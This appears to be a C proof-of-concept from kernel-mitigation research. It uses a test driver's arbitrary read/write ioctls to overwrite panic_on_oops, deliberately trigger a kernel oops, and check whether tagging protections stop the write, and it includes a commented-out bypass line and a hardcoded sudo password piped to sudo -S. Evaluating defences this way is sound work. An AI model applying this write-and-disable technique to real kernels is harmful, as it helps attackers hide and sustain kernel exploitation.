// FZY: Add a simple proof of concept that overwrites panic_on_oops from 1 to 0, allowing the system to continue running after an oops instead of panicking

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define FIELD_SIZE 4

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_TRIGGER_OOPS _IO('A', 5)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

static int orig_panic_on_oops;

void verify_panic_on_oops_addr(int fd, unsigned long panic_on_oops_addr) {
  printf("[+] panic_on_oops address: 0x%lx\n", panic_on_oops_addr);

  int current_value;
  arb_read(fd, panic_on_oops_addr, &current_value, FIELD_SIZE);
  printf("[+] Current value: %d\n", current_value);
  orig_panic_on_oops = current_value;
}

void restore_panic_on_oops(int fd, unsigned long panic_on_oops_addr) {
  int readback;

  arb_write(fd, panic_on_oops_addr, &orig_panic_on_oops, FIELD_SIZE);
  arb_read(fd, panic_on_oops_addr, &readback, FIELD_SIZE);
  if (readback == orig_panic_on_oops)
    printf("[+] panic_on_oops restored to %d\n", orig_panic_on_oops);
  else
    printf("[-] panic_on_oops restore failed, now: %d\n", readback);
}

void overwrite_panic_on_oops(int fd, unsigned long panic_on_oops_addr) {
  int new_value = 0;
  printf("[+] Overwriting panic_on_oops to %d\n", new_value);
  arb_write(fd, panic_on_oops_addr, &new_value, FIELD_SIZE);

  int verify_value;
  arb_read(fd, panic_on_oops_addr, &verify_value, FIELD_SIZE);
  printf("[+] New value: %d\n", verify_value);

  if (verify_value != new_value) {
    printf("[-] Write verification failed! Expected %d but got %d\n", 
           new_value, verify_value);
  } else {
    printf("[+] Successfully overwritten!\n");
  }
}

void verify_sysctl_value() {
  printf("[+] Verifying via sysctl\n");

  FILE *fp;
  char buf[128];

  memset(buf, 0, sizeof(buf));

  fp = popen("sh -c 'echo debian | sudo -S sysctl kernel.panic_on_oops 2>/dev/null'", "r");
  if (!fp) {
      printf("[-] Failed to execute popen\n");
      return;
  }

  if (fgets(buf, sizeof(buf), fp) == NULL) {
      printf("[-] Failed to read from pipe\n");
      pclose(fp);
      return;
  }
  
  pclose(fp);

  buf[sizeof(buf) - 1] = '\0';
  
  size_t len = strlen(buf);
  if (len > 0 && buf[len - 1] == '\n') {
      buf[len - 1] = '\0';
  }

  printf("[+] %s\n", buf);

  if (strcmp(buf, "kernel.panic_on_oops = 0") == 0) {
      printf("[+] Verification successful\n");
  }
}

// The oops kills whichever task is inside the ioctl, so fork: the parent
// survives to report the result and restore panic_on_oops.
void trigger_oops_via_null_deref(void) {
  printf("[+] Triggering oops to validate exploit\n");
  printf("[+] If panic_on_oops=0: system continues running\n");
  printf("[+] If panic_on_oops=1: system will panic\n");
  printf("[+] Method: NULL pointer dereference in kernel space\n");

  sleep(1);

  // Or the child inherits our pending buffer and prints it twice.
  fflush(stdout);

  pid_t child = fork();
  if (child < 0) {
    perror("fork");
    return;
  }

  if (child == 0) {
    int child_fd = open("/dev/arb_rw", O_RDWR);
    if (child_fd < 0) {
      perror("child: open /dev/arb_rw");
      _exit(1);
    }
    printf("[+] Calling ARB_TRIGGER_OOPS ioctl...\n");
    fflush(stdout);
    // Dereferences NULL in the driver; the task does not come back from it.
    ioctl(child_fd, ARB_TRIGGER_OOPS, 0);
    printf("[+] ioctl returned (oops may not have occurred)\n");
    _exit(0);
  }

  int status;
  waitpid(child, &status, 0);
  if (WIFSIGNALED(status))
    printf("[+] Oops task killed by signal %d, as expected\n", WTERMSIG(status));

  sleep(2);

  printf("\n[+] System is still running!\n");
  printf("[+] Check 'sudo dmesg | tail -50' for kernel oops message\n");
  printf("[+] If you see an oops but system didn't panic, panic_on_oops=0 worked!\n");
}

int main(int argc, char *argv[]) {
  printf("[+] panic_on_oops Exploitation PoC\n\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <panic_on_oops_addr>\n", argv[0]);
    printf("  mode: 0 (no protection), 1 (Sensitivity Tag), 2 (Sensitivity + TypeID Tag)\n");
    printf("  panic_on_oops_addr: nm vmlinux | grep 'panic_on_oops'\n");
    return 1;
  }

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open /dev/arb_rw");
    exit(1);
  }
  printf("[+] Opened /dev/arb_rw\n");
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("[-] Invalid mode\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long panic_on_oops_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    arb_read(arbrw_dev_fd, panic_on_oops_addr, &panic_on_oops_addr, sizeof(unsigned long));
    printf("[+] panic_on_oops address from kernel: 0x%lx\n", panic_on_oops_addr);
  
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // panic_on_oops_addr = panic_on_oops_addr | 0xFFFF000000000000;
  }
  
  verify_panic_on_oops_addr(arbrw_dev_fd, panic_on_oops_addr);

  overwrite_panic_on_oops(arbrw_dev_fd, panic_on_oops_addr);

  verify_sysctl_value();

  printf("[!] Press Enter to trigger oops (or Ctrl+C to abort)...\n");
  getchar();
  
  trigger_oops_via_null_deref();

  restore_panic_on_oops(arbrw_dev_fd, panic_on_oops_addr);

  close(arbrw_dev_fd);
  
  return 0;
}